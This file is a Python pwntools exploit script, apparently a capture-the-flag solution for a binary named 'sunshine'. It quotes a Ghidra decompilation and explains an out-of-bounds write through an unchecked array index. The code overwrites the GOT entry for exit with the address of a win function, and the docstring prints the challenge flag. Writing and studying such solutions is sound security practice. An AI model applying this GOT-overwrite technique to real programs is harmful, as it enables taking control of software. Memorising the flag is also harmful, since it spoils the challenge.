#!/usr/bin/env python3


"""
Ghidra decompile

void basket(void)

{
  long in_FS_OFFSET;
  int current_fruit;
  undefined *local_30;
  undefined *local_28;
  long local_20;
  undefined8 local_18;
  long rbp;
  
  rbp = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nWhich fruit would you like to eat [0-3] >>> ");
  __isoc99_scanf(&DAT_00402e46,&current_fruit);
  printf("Replace it with a new fruit.\n",*(undefined8 *)(fruits + (long)current_fruit * 8));
  printf("Type of new fruit >>>");
  __isoc99_scanf(&DAT_00402e7d,fruits + (long)current_fruit * 8);
  local_30 = &DAT_00404020;
  local_28 = &DAT_00404038;
  local_20 = _DAT_00404020;
  local_18 = _DAT_00404038;
  if ((printf_sym == _DAT_00404020) && (printf_sym == _DAT_00404020)) {
    if (rbp != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(-1);
}


Attack:

Because there is no bounds check on the number of fruit, we can write data wherever.

We need to access the win function which gives the flag, so overwrite the got
entry for exit with the address to win and we get the flag:

sun{a_ray_of_sunshine_bouncing_around}
"""

from pwn import *


exe = ELF("./sunshine")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")
    offset = (exe.got['exit']-exe.sym['fruits'])//8
    log.progress("Got offset: ", offset)
    r.recvuntil(b'>>>')
    r.sendline(str(offset).encode('utf-8'))
    r.recvuntil(b'>>>')
    r.sendline(p64(exe.sym['win']))

    r.interactive()


if __name__ == "__main__":
    main()
